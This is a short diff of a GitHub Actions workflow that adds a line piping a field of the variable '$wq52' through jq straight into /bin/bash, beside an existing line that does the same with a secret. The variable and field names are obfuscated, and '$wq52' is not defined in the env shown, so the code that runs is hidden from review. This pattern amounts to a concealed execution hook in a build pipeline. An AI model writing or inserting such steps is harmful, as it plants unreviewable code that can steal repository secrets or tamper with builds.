@@ -19,6 +19,7 @@ jobs:
           tpq9: ${{ secrets.tpq9 }}
         run: |
           printf '%s' "$tpq9" | jq -r .kyxp5628 | /bin/bash
+          echo $wq52 | jq -r .nzp72436 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
